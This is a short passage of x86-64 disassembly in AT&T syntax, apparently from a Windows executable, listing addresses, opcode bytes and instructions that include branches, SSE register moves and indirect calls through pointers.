   140005288:	85 c0                	test   %eax,%eax
   14000528a:	75 6e                	jne    0x1400052fa
   14000528c:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140005290:	85 c0                	test   %eax,%eax
   140005292:	74 4b                	je     0x1400052df
   140005294:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   14000529b:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   14000529f:	4c 8b c8             	mov    %rax,%r9
   1400052a2:	48 8b 05 47 cb 03 00 	mov    0x3cb47(%rip),%rax        # 0x140041df0
   1400052a9:	48 8b d3             	mov    %rbx,%rdx
   1400052ac:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400052b1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400052b5:	ff 15 f5 61 02 00    	call   *0x261f5(%rip)        # 0x14002b4b0
   1400052bb:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400052bf:	0f 10 00             	movups (%rax),%xmm0
   1400052c2:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400052c6:	48 8b 05 cb cb 03 00 	mov    0x3cbcb(%rip),%rax        # 0x140041e98
   1400052cd:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400052d1:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400052d5:	ff 15 d5 61 02 00    	call   *0x261d5(%rip)        # 0x14002b4b0
